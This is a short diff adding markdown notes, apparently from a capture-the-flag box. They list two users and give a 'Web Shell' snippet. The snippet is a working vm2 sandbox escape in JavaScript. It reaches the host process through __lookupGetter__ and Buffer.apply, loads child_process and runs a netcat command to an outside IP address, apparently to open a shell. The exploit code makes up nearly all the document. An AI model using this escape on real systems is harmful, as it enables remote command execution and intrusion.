@@ -1,0 +1,21 @@
+
+## Users:
+ 1. joshua
+ 1. svc
+
+### Web Shell:
+
+""" js
+const {VM} = require("vm2");
+
+const vm = new VM();
+
+const code = `
+const g = ({}).__lookupGetter__;
+const a = Buffer.apply;
+const p = a.apply(g, [Buffer, ['__proto__']]);
+p.call(a).constructor('return process')().mainModule.require('child_process').execSync('nc 10.10.14.5 53');
+`;
+
+vm.run(code);
+"""
